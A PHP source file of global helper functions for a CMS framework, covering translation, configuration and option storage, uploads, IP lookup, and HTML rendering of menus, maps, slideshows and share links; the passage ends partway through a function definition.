<?php
    use Thin\Data;
    use Thin\Activerecord;
    use Thin\Querydata;
    use Thin\Config;
    use Thin\Configdata;
    use Thin\Optiondata;
    use Thin\Container;
    use Thin\Object;
    use Thin\Inflector;
    use Thin\Arrays;
    use Thin\Utils;
    use Thin\Cms;
    use Thin\Orm;
    use Thin\File;
    use Thin\View;
    use Thin\Session;
    use Thin\Cache;
    use Thin\Exception;
    use Thin\Registry;
    use Thin\Functions;
    use Thin\Forever;
    use Thin\Memorydb;
    use Thin\Context;
    use Thin\App;
    use Thin\Facade;
    use Thin\Smtp;
    use Thin\Entitydb;
    use Thin\Filesystem;
    use Thin\Dispatcher;
    use Thin\Eventable;
    use Thin\Doctrine;
    use Thin\Autoloader;
    use Thin\Database;
    use Thin\Instance;
    use Thin\Request;
    use Thin\Tool;
    use Thin\Database\Validator as DBValidator;
    use Thin\Load\Ini as IniLoad;
    use Thin\Session\Redis as RedisSession;

    if (!function_exists('validator')) {
        function validator(Database $model)
        {
            return DBValidator::instance($model);
        }
    }

    if (!function_exists('jdb')) {
        function jdb($db, $table)
        {
            return \Dbjson\Dbjson::instance($db, $table);
        }

        function jmodel($table, $db = 'core')
        {
            return \Dbjson\Dbjson::instance($db, $table);
        }

        function coreCache()
        {
            return \Dbjson\Dbjson::instance();
        }

        function now($sql = false)
        {
            return !$sql ? time() : date('Y-m-d H:i:s');
        }
    }

    if (!function_exists('eav')) {
        function eav($db, $table)
        {
            return \EavBundle\Eav::instance($db, $table);
        }
    }

    if (!function_exists('iniLoad')) {
        function iniLoad($filename, $section = null, $options = false)
        {
            if (!strstr($filename, DS)) {
                $tab = explode('.', $filename);
                $filename = path('config') . DS . implode(DS, $tab) . '.ini';
            }
            return new IniLoad($filename, $section, $options);
        }
    }

    if (!function_exists('action')) {
        function action($tag, $closure)
        {
            return context('actions');
        }

        function string()
        {
            return context('string');
        }

        function events()
        {
            $events = container()->getEvents();
            if (is_null($events)) {
                $events = new Dispatcher(new Eventable);
                container()->setEvents($events);
            }
            return $events;
        }
    }

    if (!function_exists('context')) {
        function context($context = 'core')
        {
            return Context::instance($context);
        }
    }

    if (!function_exists('facade')) {
        function facade($name)
        {
            $name = ucfirst(strtolower($name));
            $code = 'class ' . $name . ' extends Thin\\Facade {protected static function factory(){ return ' . strtolower($name) . ';}}';
            eval($code);
            return new $name();
        }

        function di()
        {
            return phalcon()->getDI();
        }

        function db($db = 'db')
        {
            return context($db);
        }
    }

    if (!function_exists('infosIP')) {
        function infosIP($array = false, $localhost = false)
        {
            $session = session('web');
            $infosIP = $session->getInfosIp();
            if (empty($infosIP)) {
                $ip = $_SERVER["REMOTE_ADDR"];
                if (true === $localhost) {
                    $url = "http://ip-api.com/json";
                } else {
                    $url = "http://ip-api.com/json/$ip";
                }
                $json = dwn($url);
                $json = str_replace(
                    array(
                        'query',
                        'countryCode',
                        'regionName'
                    ),
                    array(
                        'ip',
                        'country_code',
                        'region_name'
                    ),
                    $json
                );
                $infos = json_decode($json, true);
                if (Arrays::is($infos)) {
                    if (Arrays::exists('status', $infos)) {
                        if ($infos['status'] == 'fail') {
                            return infosIP($array, true);
                        }
                    }
                    $InfosIp = o("IP");
                    $InfosIp->populate($infos);
                    $session->setInfosIp($InfosIp);
                }
            }
            return false === $array ? $infosIP : $infos;
        }
    }

    if (!function_exists('mySprintf')) {
        function mySprintf($str = null, $args = array(), $char = '%')
        {
            if (empty($str)) {
                return '';
            }
            if (count($args) > 0) {
                foreach ($args as $k => $v) {
                    $str = str_replace($char . $k, $v, $str);
                }
            }
            return $str;
        }
    }

    if (!function_exists('core')) {
        function core()
        {
            $a = func_get_args();
            $i = Functions::instance();
            if (!empty($a)) {
                if (2 == count($a)) {
                    $n = Arrays::first($a);
                    $f = Arrays::last($a);
                    $i->$n = $f;
                } elseif (1 == count($a)) {
                    $n = Arrays::first($a);
                    return $i->$n;
                }
            }
            return $i;
        }

        function nsCore($ns = 'default')
        {
            return Functions::instance($ns);
        }
    }

    if (!function_exists('redis')) {
        function redis()
        {
            $redis = container()->getRedis();
            if (null === $redis) {
                // require_once "predis/autoload.php";
                // PredisAutoloader::register();
                $args = func_get_args();
                if (count($args)) {
                    extract(Arrays::first($args));
                }
                $host   = isset($host)      ? $host     : '127.0.0.1';
                $scheme = isset($scheme)    ? $scheme   : 'tcp';
                $port   = isset($port)      ? $port     : 6379;

                try {
                    $redis = new Predis\Client(
                        array(
                            "scheme"    => $scheme,
                            "host"      => $host,
                            "port"      => $port
                        )
                    );
                    container()->setRedis($redis);
                }
                catch (Exception $e) {
                    echo "Couldn't connected to Redis";
                    echo $e->getMessage();
                    return null;
                }
            }
            return $redis;
        }
    }

    if (!function_exists('dm')) {
        function dm($entity = null, $results = array())
        {
            return new Querydata($entity, $results);
        }
    }
    if (!function_exists('lng')) {
        function lng($string, $params = array(), $echo = true)
        {
            $lng        = session('web')->getLanguage();
            $default    = options()->getDefaultLanguage();
            if ($lng == $default) {
                $translation = assignParams($string, $params);
                if (true === $echo) {
                    echo $translation;
                } else {
                    return $translation;
                }
            } else {
                $getter = getter($lng);
                $tab    = languages()->$getter();
                $what   = Arrays::exists(sha1($string), $tab) ? $tab[sha1($string)] : $string;
                $translation = assignParams($what, $params);
                if (true === $echo) {
                    echo $translation;
                } else {
                    return $translation;
                }
            }
        }

        function assignParams($string, $params = array())
        {
            if (!count($params)) {
                return $string;
            }
            foreach ($params as $key => $value) {
                $what   = "##$key##";
                $string = str_replace($what, $value, $string);
            }
            return $string;
        }

        function parseLanguage($file)
        {
            $tab        = array();
            $cnt        = fgc($file);
            $sentences  = explode('@@@', $cnt);
            $key        = null;
            if (count($sentences)) {
                foreach ($sentences as $sentence) {
                    $sentence   = trim($sentence);
                    $rows       = explode("\n", $sentence);
                    if (count($rows)) {
                        foreach ($rows as $row) {
                            $row = trim($row);
                            if (!contain('[:', $row)) {
                                $key = $row;
                            } else {
                                $lng         = Utils::cut('[:', ':]', $row);
                                $translation = str_replace("[:$lng:]", '', $row);
                                if (!Arrays::exists(Inflector::lower($lng), $tab)) {
                                    $tab[Inflector::lower($lng)] = array();
                                }
                                $tab[Inflector::lower($lng)][sha1($key)] = $translation;
                            }
                        }
                    }
                }
            }
            foreach ($tab as $lng => $sentences) {
                $setter = setter($lng);
                languages()->$setter($sentences);
            }
        }

        function languages()
        {
            return o('languages');
        }

        function addTranslation($name, $value, $language)
        {
            $db = dm('translation');
            $res = $db->where('name = ' . sha1($name))->where('language = ' . $language)->get();
            if (count($res)) {
                $t = $db->first($res);
            } else {
                $t = newData('translation');
            }
            $t->setName(sha1($name))->setLanguage($language)->setValue($value)->save();
        }

        function t($key, $params = array(), $echo = true)
        {
            $lng = session('web')->getLanguage();
            if ($lng == options()->getDefaultLanguage()) {
                if (true === $echo) {
                    echo $key;
                } else {
                    return $key;
                }
            }
            $db = dm('translation');
            $res = $db->where('name = ' . sha1($key))->where('language = ' . $lng)->get();
            if (count($res)) {
                $row = $db->first($res);
                $translation = assignParams($row->getValue(), $params);
                if (true === $echo) {
                    echo $translation;
                } else {
                    return $translation;
                }
            }

            if (true === $echo) {
                echo $key;
            } else {
                return $key;
            }
        }
    }

    if (!function_exists('upload')) {
        function upload($field)
        {
            $bucket = container()->bucket();

            if (Arrays::exists($field, $_FILES)) {
                $fileupload         = $_FILES[$field]['tmp_name'];
                $fileuploadName     = $_FILES[$field]['name'];

                if (strlen($fileuploadName)) {
                    $tab = explode(".", $fileuploadName);
                    $data = fgc($fileupload);

                    if (!strlen($data)) {
                        return null;
                    }

                    $ext = Inflector::lower(Arrays::last($tab));
                    $res = $bucket->data($data, $ext);
                    return $res;
                }
            }
            return null;
        }

        function bucketSize($url)
        {
            $file = repl(URLSITE, '', $url);
            $file = realpath(APPLICATION_PATH . '/../public/' . $file);
            return File::exists($file) ? getFileSize(fgc($file)) : '0 kb';
        }
    }

    if (!function_exists('unstatic')) {
        function unstatic($class)
        {
            $obj = new Thin\Unstatic($class);
            return $obj;
        }
    }

    if (!function_exists('params')) {
        function params($args = array())
        {
            $params = array();
            if (count($args)) {
                foreach ($args as $k => $arg) {
                    $num = $k + 1;
                    $key = 'param' . $num;
                    $params[$key] = $arg;
                }
            }
            return $params;
        }
    }

    if (!function_exists('cdn')) {
        function cdn($file)
        {
            return 'http://cdn.cityzend.com/u/45880241/cdn/' . $file;
        }
    }

    if (!function_exists('can')) {
        function can($type, $action)
        {
            $action     = Inflector::lower($action);
            $type       = Inflector::lower($type);
            $session    = session('admin');
            $user       = $session->getUser();
            if (Arrays::exists($type, Data::$_fields) && Arrays::exists($type, Data::$_rights) && null !== $user) {
                $rights = Data::$_rights[$type];
                if (Arrays::exists($action, $rights)) {
                    return $rights[$action];
                }
            }
            return false;
        }
    }

    if (!function_exists('route')) {
        function route()
        {
            return with(new Container)->setIsRoute(true);
        }
    }

    if (!function_exists('o')) {
        function o($name)
        {
            $objects = Utils::get('thinObjects');
            if (null === $objects) {
                $objects = array();
            }
            if (Arrays::exists($name, $objects)) {
                return $objects[$name];
            }
            $newObj = new Container;
            $newObj->setIsThinObject($name);
            $objects[$name] = $newObj;
            Utils::set('thinObjects', $objects);
            return $newObj;
        }
    }

    if (!function_exists('ar')) {
        function ar($entity, $table, $params = array(), $fields = array())
        {
            $model = array();
            $settings = array();
            $settings['entity'] = $entity;
            $settings['table'] = $table;
            $settings['relationships'] = rs($entity, $table);
            if (count($params) && Arrays::isAssoc($params)) {
                foreach ($params as $key => $value) {
                    $settings[$key] = $value;
                }
            }
            $model['settings'] = $settings;
            if (count($fields) && Arrays::isAssoc($fields)) {
                $model['fields'] = $fields;
            }
            return new Activerecord($model);
        }
    }

    if (!function_exists('isAke')) {
        function isAke($tab, $key, $default = array())
        {
            return Arrays::is($tab) ?
                Arrays::isAssoc($tab) ?
                    Arrays::exists($key, $tab) ?
                        $tab[$key] :
                    $default :
                $default :
            $default;
        }
    }

    if (!function_exists('f')) {
        function f()
        {
            $args = func_get_args();
            if (0 < count($args)) {
                $closure = array_shift($args);
                if(is_callable($closure)) {
                    return call_user_func_array($closure, $args);
                }
            }
            return null;
        }

        function view()
        {
            $view = container()->getView();
            return !is_null($view) ? $view : new View();
        }
    }

    if (!function_exists('setArrayXpathValue')) {
        /**
         * Set value of an array by using "root/branch/leaf" notation
         *
         * @param array $array Array to affect
         * @param string $path Path to set
         * @param mixed $value Value to set the target cell to
         * @return void
         */
        function setArrayXpathValue(array &$array, $path, $value, $delimiter = '/')
        {
            // fail if the path is empty
            if (empty($path)) {
                throw new Exception('Path cannot be empty');
            }

            // fail if path is not a string
            if (!is_string($path)) {
                throw new Exception('Path must be a string');
            }

            // remove all leading and trailing delimiters
            $path = trim($path, $delimiter);

            // split the path in into separate parts
            $parts = explode($delimiter, $path);

            // initially point to the root of the array
            $pointer =& $array;

            // loop through each part and ensure that the cell is there
            foreach ($parts as $part) {
                // fail if the part is empty
                if (empty($part)) {
                    throw new Exception('Invalid path specified: ' . $path);
                }

                // create the cell if it doesn't exist
                if (!isset($pointer[$part])) {
                    $pointer[$part] = array();
                }

                // redirect the pointer to the new cell
                $pointer =& $pointer[$part];
            }

            // set value of the target cell
            $pointer = $value;
        }
    }

    if (!function_exists('getOption')) {
        function getOption($key)
        {
            return Cms::getOption($key);
        }

        function setOption($key, $value)
        {
            $db = dm('option');
            $res = $db->where('name = ' . $key)->get();
            if (count($res)) {
                $option = $db->first($res);
            } else {
                $option = newData('option');
            }
            return $option->setName($key)->setValue($value)->save();
        }

        function options()
        {
            return new Optiondata;
        }

        function configs()
        {
            return new Configdata;
        }


        function getConfig($key, $environment = null)
        {
            if (null === $environment) {
                $environment = APPLICATION_ENV;
            }
            $db = dm('config');
            $res = $db->where('name = ' . $key)->where('environment = ' . $environment)->get();
            if (!count($res)) {
                $all = $db->where('name = ' . $key)->where('environment = all')->get();
                if (count($all)) {
                    return $db->first($all);
                } else {
                    return null;
                }
            } else {
                return $db->first($res);
            }
        }

        function setConfig($key, $value, $environment = null)
        {
            if (null === $environment) {
                $environment = 'all';
            }
            $db = dm('config');
            $res = $db->where('name = ' . $key)->where('environment = ' . $environment)->get();
            if (count($res)) {
                $config = $db->first($res);
            } else {
                $config = newData('config');
            }
            return $config->setName($key)->setEnvironment($environment)->setValue($value)->save();
        }

        function getMeta($key)
        {
            $db = dm('meta');
            $res = $db->where('name = ' . $key)->get();
            if (count($res)) {
                $meta = $db->first($res);
                return Cms::__($meta);
            }
            return null;
        }

        function setMeta($key, $value)
        {
            $db = dm('meta');
            $res = $db->where('name = ' . $key)->get();
            if (count($res)) {
                $meta = $db->first($res);
            } else {
                $meta = newData('meta');
            }
            return $meta->setName($key)->setValue($value)->save();
        }

        function metas()
        {
            return new Metadata;
        }
    }

    if (!function_exists('cms_info')) {

        function getBool($bool = 'true')
        {
            $db = dm('bool');
            $res = $db->where('value = ' . $bool)->get();
            if (count($res)) {
                return $db->first($res);
            }
            return null;
        }

        function getStatus($status = 'online')
        {
            $db = dm('statuspage');
            $res = $db->where('name = ' . $status)->get();
            if (count($res)) {
                return $db->first($res);
            }
            return null;
        }

        function cms_get_page($name = 'home')
        {
            $db = dm('page');
            $res = $db->where('name = ' . $name)->get();
            if (count($res)) {
                return $db->first($res);
            }
            return null;
        }

        function cms_info($type, $key, $page, $default = null)
        {
            $lng = getLanguage();
            if ($page instanceof Container) {
                $db = dm($type);
                $infos = $db->where('name = ' . $key)->where('page = ' . $page->getId())->get();
                if (count($infos)) {
                    $info = $db->first($infos);
                    $value = $info->getValue();

                    if (Arrays::is($value)) {
                        if (Arrays::exists($lng, $value)) {
                            return Cms::executePHP($value[$lng], false);
                        }
                    }
                }
            }
            return $default;
        }
    }

    if (!function_exists('cms_ga')) {
        function cms_ga($account, $domain = null, $echo = true)
        {
            if (empty($domain)) {
                $domain = $_SERVER['SERVER_NAME'];
            }

            $html = '<script type="text/javascript">
var _gaq=_gaq||[];
_gaq.push([\'_setAccount\', \'' . $account . '\']);
_gaq.push([\'_setDomainName\', \'' . $domain . '\']);
_gaq.push([\'_trackPageview\']);
(function(){
var ga=document.createElement(\'script\');ga.type=\'text/javascript\';ga.async=true;
ga.src=(\'https:\'==document.location.protocol?\'https://ssl\':\'http://www\')+\'.google-analytics.com/ga.js\';
var s=document.getElementsByTagName(\'script\')[0];s.parentNode.insertBefore(ga,s);
})();
</script>';
            if (true === $echo) {
                echo $html;
            } else {
                return $html;
            }
        }
    }

    if (!function_exists('cms_hook')) {
        function cms_hook()
        {
            return call(func_get_args());
        }
    }

    if (!function_exists('cms_facebook')) {
        function cms_facebook($echo = true)
        {
            $urlPage = getUrl();
            $url     = 'http://www.facebook.com/sharer.php?u=' . $urlPage . '&amp;t=' . urlencode(cms_title());

            if (true === $echo) {
                echo $url;
            } else {
                return $url;
            }
        }
    }

    if (!function_exists('cms_twitter')) {
        function cms_twitter($echo = true)
        {
            $urlPage            = getUrl();
            $twitterAccount     = cms_option('twitter_account');
            if (empty($twitterAccount)) {
                $twitterAccount = 'thinCMS';
            }
            $url = 'http://twitter.com/share?url=' . $urlPage . '&amp;text=' . urlencode(cms_title()) . '&amp;via=' . $twitterAccount;

            if (true === $echo) {
                echo $url;
            } else {
                return $url;
            }
        }
    }

    if (!function_exists('cms_linkedin')) {
        function cms_linkedin($echo = true)
        {
            $urlPage            = getUrl();
            $linkedinAccount    = cms_option('linkedin_account');
            if (empty($linkedinAccount)) {
                $linkedinAccount = 'thinCMS';
            }
            $url = 'https://www.linkedin.com/shareArticle?url=' . $urlPage . '&amp;title=' . urlencode(cms_title()) . '&amp;source=' . $linkedinAccount;

            if (true === $echo) {
                echo $url;
            } else {
                return $url;
            }
        }
    }

    if (!function_exists('cms_title')) {
        function cms_title()
        {
            return cms_translate('title');
        }
    }

    if (!function_exists('cms_keywords')) {
        function cms_keywords()
        {
            return cms_translate('keywords');
        }
    }

    if (!function_exists('cms_description')) {
        function cms_description()
        {
            return cms_translate('description');
        }
    }

    if (!function_exists('cms_translate')) {
        function cms_translate($field)
        {
            $page   = container()->getCmsPage();
            $getter = getter($field);
            $value  = $page->$getter();
            return Cms::lng($value);
        }
    }

    if (!function_exists('trad')) {
        function trad($id, $default, $args = '')
        {
            $app = App::instance();
            $lang = $app->getLang();
            $translation = $lang->translate($id, $default);
            $args = eval('return array(' . $args . ');');
            if (count($args)) {
                foreach ($args as $key => $value) {
                    $translation = str_replace("%$key%", $value, $translation);
                }
            }
            return $translation;
        }
    }

    if (!function_exists('cms_partial')) {
        function cms_partial($name, $params = array(), $echo = true)
        {
            $query      = dm('partial');
            $res        = $query->where("name = $key")->get();
            if (count($res)) {
                $row    = $query->first($res);
                $html   = Cms::executePHP($row->getValue());

                if (count($params)) {
                    foreach ($params as $k => $v) {
                        $needle = '##' . $k . '##';
                        $html = repl($needle, $v, $html);
                    }
                }

                if (true === $echo) {
                    echo $html;
                } else {
                    return $html;
                }
            }
            return null;
        }
    }

    if (!function_exists('cms_fa')) {
        function cms_fa($name, $plus = '', $echo = true)
        {
            if (false === $echo) {
                return "<i class=\"fa fa-$name $plus\"></i> ";
            } else {
                echo "<i class=\"fa fa-$name $plus\"></i> ";
            }
        }
    }

    if (!function_exists('cms_language')) {
        function cms_language()
        {
            return container()->getCmsLanguage();
        }
    }

    if (!function_exists('cms_header')) {
        function cms_header()
        {
            $page   = container()->getCmsPage();
            $html = Cms::executePHP(Cms::lng($page->getHeader()->getHtml()), false);
            echo $html;
        }
    }

    if (!function_exists('cms_footer')) {
        function cms_footer()
        {
            $page   = container()->getCmsPage();
            $html = Cms::executePHP(Cms::lng($page->getFooter()->getHtml()), false);
            echo $html;
        }
    }

    if (!function_exists('cms_render')) {
        function cms_render($tpl)
        {
            $file = cms_theme_path() . DS . Inflector::lower($tpl) . '.php';
            if (File::exists($file)) {
                require_once $file;
            }
        }
    }

    if (!function_exists('cms_content_display')) {
        function cms_content_display()
        {
            echo Cms::display();
        }
    }

    if (!function_exists('cms_theme_path')) {
        function cms_theme_path()
        {
            $theme = Cms::getOption('theme');
            return THEME_PATH . DS . $theme;
        }
    }

    if (!function_exists('cms_url')) {
        function cms_url()
        {
            return substr(URLSITE, 0, -1);
        }
    }

    if (!function_exists('cms_url_theme')) {
        function cms_url_theme($echo = true)
        {
            $theme = Cms::getOption('theme');
            if (false === $echo) {
                return URLSITE . 'themes/' . $theme;
            } else {
                echo URLSITE . 'themes/' . $theme;
            }
        }
    }

    if (!function_exists('cms_image')) {
        function cms_media($type, $name)
        {
            $db = dm(Inflector::lower($type));
            $res = $db->where('name = ' . $name)->get();
            if (count($res)) {
                return $db->first($res);
            }
            return null;
        }

        function cms_file($name)
        {
            $row = cms_media('file', $name);
            if (!empty($row)) {
                return $row->getMedia();
            }
            return null;
        }

        function cms_video($name)
        {
            $row = cms_media('video', $name);
            if (!empty($row)) {
                return $row->getMedia();
            }
            return null;
        }

        function cms_image($name, $html = false)
        {
            $row = cms_media('image', $name);
            if (!empty($row)) {
                if (false !== $html) {
                    return '<img src="' . $row->getMedia() . '" />';
                } else {
                    return $row->getMedia();
                }
            }
            return null;
        }
    }

    if (!function_exists('cms_map')) {
        function cms_map($echo = true)
        {
            $longitude  = cms_option('longitude');
            $latitude   = cms_option('latitude');
            $html       = '<style type="text/css">
    #map{width:100%;height:300px;margin:auto;}
  </style><div id="map"></div>';
            $html       .= '<script src="https://maps.googleapis.com/maps/api/js?v=3.exp&amp;sensor=false"></script>
            <script type="text/javascript">
var map;
var initialize;

initialize = function(){
  var latLng = new google.maps.LatLng(' . $latitude . ', ' . $longitude . ');
  var myOptions = {
    zoom      : 16,
    center    : latLng,
    draggable: false,
    mapTypeId : google.maps.MapTypeId.TERRAIN,
    maxZoom   : 20
  };
  map      = new google.maps.Map(document.getElementById(\'map\'), myOptions);
  var marker = new google.maps.Marker({
    position : latLng,
    icon     : \''. cms_image('map_marker_ico') . '\',
    map      : map,
    title    : "'. cms_option('map_marker_name') . '"
});
    var infowindow = new google.maps.InfoWindow({
      content: \'<div style="color: black">'. str_replace(array("\n", "\r", "\t"), "", cms_option('map_text')) . '</div>\'
    });
    google.maps.event.addListener(marker, \'click\', function() {
    infowindow.open(map, marker);
  });
};
initialize();
    </script>';

            if (true === $echo) {
                echo $html;
            } else {
                return $html;
            }
        }
    }
    if (!function_exists('cms_google_fonts')) {
        function cms_google_fonts()
        {
            $fonts = cms_option('google_fonts');
            if (!empty($fonts)) {
                $tab = explode(',', $fonts);
                $cssFonts = implode(':400,300,700,900,600|', $tab);
                $cssFonts = repl(' ', '+', $cssFonts) . ':400,300,700,900,600&amp;subset=latin,latin-ext';
                return '<link rel="stylesheet" type="text/css" href="http://fonts.googleapis.com/css?family=' . $cssFonts . '">';
            }

            return '';
        }
    }

    if (!function_exists('cms_form')) {
        function cms_form($name, $echo = true)
        {
            $form = Cms::makeForm($name);
            if (true === $echo) {
                echo $form;
            } else {
                return $form;
            }
        }
    }

    if (!function_exists('cms_menu_auto')) {
        function cms_menu_auto($echo = true)
        {
            $show       = cms_option('show_menu');
            if ('true' != $show) return;
            $pages      = Thin\Cms::getParents();
            $actualPage = container()->getPage();

            $parent     = $actualPage->getParent();
            $lngs       = explode(',', cms_option('page_languages'));
            $pageParent = new url;
            if (!empty($parent)) {
                $sql = dm('page');
                $pageParents = $sql->where('id = ' . $parent)->get();
                $pageParent = $sql->first($pageParents);
            }

            $html = '
<script>
$(document).ready(function() {
    $(\'#mainNavbar\').scrollspy()
});
</script><form action="" method="post" id="lng_form"><input id="cms_lng" name="cms_lng" value="' . getLanguage() . '" /></form>';

            $fixed      = 'true' == cms_option('menu_fixed') ? true : false;
            $showLogo   = 'true' == cms_option('show_logo') ? true : false;
            if (true === $fixed) $html .= '<div id="mainNavbar" class="navbar navbar-fixed-top navbar-inverse">';
            else $html .= '<div class="navbar navbar-inverse">';

            $html .= '<div class="navbar-inner">
                <div class="container">';
            $html .= '<a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                    </a>';
            if (false === $showLogo) {
                $html .= '<a class="brand" href="/">' . cms_option('company_name') . '</a>';
            } else {
                $html .= '<a id="logoLink" class="brand" href="/"><img style="max-width: ' . cms_option('logo_max_width') . ';" src="' . cms_image('logo') . '" /></a>';
            }

            $html .= '<div class="nav-collapse collapse">';
            $html .= '<ul class="nav" id="mainMenu">';
            foreach ($pages as $page) {
                $children   = Cms::getChildren($page);

                $active     = Cms::__($page->getUrl()) == Cms::__($actualPage->getUrl()) || Cms::__($page->getUrl()) == Cms::__($pageParent->getUrl());
                $dropdown   = count($children) > 0 ? ' dropdown' : '';
                $linkClass  = count($children) > 0 ? ' class="dropdown-toggle openHover" data-toggle="dropdown"' : '';
                $caret      = count($children) > 0 ? ' <b class="caret"></b>' : '';

                if ($active) $html .= '<li class="active' . $dropdown . '"><a' . $linkClass . ' href="/' . Cms::__($page->getUrl()) . '">' . Cms::__($page->getMenu()) . $caret . '</a>';
                else $html .= '<li class="' . $dropdown . '"><a' . $linkClass . ' href="/' . Cms::__($page->getUrl()) . '">' . Cms::__($page->getMenu()) . $caret . '</a>';
                if (count($children)) {
                    $html .= '<ul class="dropdown-menu">';
                    foreach ($children as $child) {
                        $html .= '<li><a href="/' . Cms::__($child->getUrl()) . '">' . Cms::__($child->getMenu()) . '</a></li>';
                    }
                    $html .= '</ul>';
                }
                $html .= '</li>';
            }
            $html .= '</ul>';
            $session = session('admin');
            $user = $session->getUser();
            if (1 < count($lngs) || null !== $user) {
                $actualLng = getLanguage();
                $html .= '<ul id="mainMenu" class="nav navbar-nav pull-right">';
                if (null !== $user) {
                    $html .= '<li><a target="_admin" rel="tooltip-bottom" title="Accès à l\'admin" href="' . URLSITE . 'backadmin/dashboard"><i class="fa fa-cogs"></i></a></li>';
                }
                if (1 < count($lngs)) {
                    foreach($lngs as $lng) {
                        if ($lng <> $actualLng) {
                            $displayOption = cms_option('lng_' . $lng . '_display');
                            if (null === $displayOption) {
                                $html .= '<li><a href="#" onclick="$(\'#cms_lng\').val(\'' . $lng . '\'); $(\'#lng_form\').submit(); return false;">' . Inflector::upper($lng) . '</a></li>';
                            } elseif ('flag' == $displayOption) {
                                $html .= '<li><a href="#" onclick="$(\'#cms_lng\').val(\'' . $lng . '\'); $(\'#lng_form\').submit(); return false;"><img src="' . URLSITE . 'assets/img/flags/' . $lng . '.png" /></a></li>';
                            }
                        }
                    }
                }
                $html .= '</ul>';
            }
            $html .= '</div>';
            $html .= '</div>';
            $html .= '</div>';
            $html .= '</div>';

            if (true === $echo) {
                echo $html;
            } else {
                return $html;
            }
        }
    }

    if (!function_exists('cms_url_page')) {
        function cms_url_page($page = null)
        {
            if (null === $page) {
                return getUrl();
            } else {
                $query = dm('page');
                $res = $query->where("name = $page")->get();
                if (count($res)) {
                    $page = $query->first($res);
                } else {
                    return URLSITE . $page;
                }
            }
            return URLSITE . $page->getUrl();
        }
    }

    if (!function_exists('cms_youtube')) {
        function cms_youtube($id, $echo = true)
        {
            $html = '<div class="flex-video widescreen"><iframe src="https://www.youtube-nocookie.com/embed/' . $id . '" frameborder="0" allowfullscreen=""></iframe></div>';
            if (true === $echo) {
                echo $html;
            } else {
                return $html;
            }
        }
    }

    if (!function_exists('cms_slideshow')) {
        function cms_slideshow($name, $echo = true)
        {
            $html = '';
            Data::getAll('slideshow');
            Data::getAll('slideshowmedia');
            $db = dm('slideshow');
            $res = $db->where('name = ' . $name)->get();
            $slideshowHeight = cms_option('slideshow_height');
            $slideshowBg = cms_option('slideshow_background');
            if (count($res)) {
                $slideshow = $db->first($res);
                $dbMedia = dm('slideshowmedia');
                $rows = $dbMedia->where('slideshow = ' . $slideshow->getId())->order('position')->get();
                if (count($rows)) {
                    $html .= '<style>


.slideSize {
    font-size: 24px;
    position: relative;
    top: -15px;
}
.tales {
  width:auto !important;
  margin:auto !important;
  max-height: ' . $slideshowHeight . ' !important;
}
.carousel-inner {
  width:auto !important;
  max-height: ' . $slideshowHeight . ' !important;
  background: ' . $slideshowBg . ';
}
.carousel .item {-webkit-transition: opacity 3s; -moz-transition: opacity 3s; -ms-transition: opacity 3s; -o-transition: opacity 3s; transition: opacity 3s;}
.carousel .active.left {left:0;opacity:0;z-index:2;}
.carousel .next {left:0;opacity:1;z-index:1;}
</style>
<script>
$(document).ready(function() {
    $(\'.carousel\').carousel({
        interval: 2000
    })
});
</script>
                    <div class="row"><div id="slideshow_' . $slideshow->getId() . '" class="carousel slide">';
                    $html .= '<ol class="carousel-indicators">';
                    for ($i = 0 ; $i < count($rows) ; $i++) {
                        $ac = $i < 1 ? 'active' : '';
                        $html .= '<li data-target="#slideshow_' . $slideshow->getId() . '" data-slide-to="' . $i . '" class="' . $ac . '"></li>';
                    }
                    $html .= '</ol><div class="carousel-inner">';
                    $first = true;
                    foreach ($rows as $media) {
                        $active = $first ? ' active' : '';
                        $html .= '<div class="item' . $active . '">';
                        $html .= '<a href="' . Cms::__($media->getLink()) . '">';
                        $html .= '<img class="tales" src="' . $media->getImage() . '" alt="' . $slideshow->getName() . ' ' . $media->getPosition() . '" title ="' . $slideshow->getName() . ' ' . $media->getPosition() . '" />';
                        $html .= '</a>';
                        $html .= '<div class="carousel-caption">';
                        $html .= '<p>' . Cms::__($media->getText()) . '</p>';
                        $html .= '</div>';
                        $html .= '</div>';
                        $first = false;
                    }
                    $html .= '</div>
                    <a class="left carousel-control" href="#slideshow_' . $slideshow->getId() . '" data-slide="prev"><i class="fa fa-arrow-left slideSize"></i></a>
                        <a class="right carousel-control" href="#slideshow_' . $slideshow->getId() . '" data-slide="next"><i class="fa fa-arrow-right slideSize"></i></a>
                    </div></div>';
                }
            }
            if (true === $echo) {
                echo $html;
            } else {
                return $html;
            }
        }
    }

    if (!function_exists('cms_snippet')) {
        function cms_snippet($name, $params = array(), $echo = true)
        {
            $snippet = Cms::execSnippet($name, $params);
            if (true === $echo) {
                echo $snippet;
            } else {
                return $snippet;
            }
        }
    }

    if (!function_exists('cms_object')) {
        function cms_object($collection, $objectName, $array = false)
        {
            $object = new cmsObj();
            $q      = dm('collection');
            $res    = $q->where('name = ' . $collection)->get();
            if (count($res)) {
                $row  = $q->first($res);
                $q    = dm('object');
                $res  = $q->where('collection = ' . $row->getId())->where("name = $objectName")->get();
                if (count($res)) {
                    $obj        = $q->first($res);
                    $objectLng  = Cms::lng($obj->getValue());
                    $ini        = parse_ini_string($objectLng, true);
                    $object->populate($ini);
                }
            }
            return $object;
        }
    }

    if (!function_exists('cms_objects')) {
        function cms_objects($collection, $array = false)
        {
            $coll   = array();
            $q      = dm('collection');
            $res    = $q->where('name = ' . $collection)->get();
            if (count($res)) {
                $row        = $q->first($res);
                $q          = dm('object');
                $objects    = $q->where('collection = ' . $row->getId())->get();
                if (count($objects)) {
                    foreach ($objects as $object) {
                        $objectLng  = Cms::lng($object->getValue());
                        $ini        = parse_ini_string($objectLng, true);
                        if (true === $array) {
                            array_push($coll, $ini);
                        } else {
                            $obj = new cmsObj();
                            $obj->populate($ini);
                            array_push($coll, $obj);
                        }
                    }
                }
            }
            return $coll;
        }
    }

    if (!function_exists('cms_option')) {
        function cms_option($option)
        {
            return Cms::executePHP(Cms::getOption($option), false);
        }
    }

    if (!function_exists('cms_translate')) {
        function cms_translate($key, $params = array(), $default = null)
        {
            return Cms::translate($key, $params, $default);
        }
    }

    if (!function_exists('arrayXpathValue')) {
        /**
         * Get value of an array by using "root/branch/leaf" notation
         *
         * @param array $array   Array to traverse
         * @param string $path   Path to a specific option to extract
         * @param mixed $default Value to use if the path was not found
         * @return mixed
         */
        function arrayXpathValue(array $array, $path, $default = null, $delimiter = '/')
        {
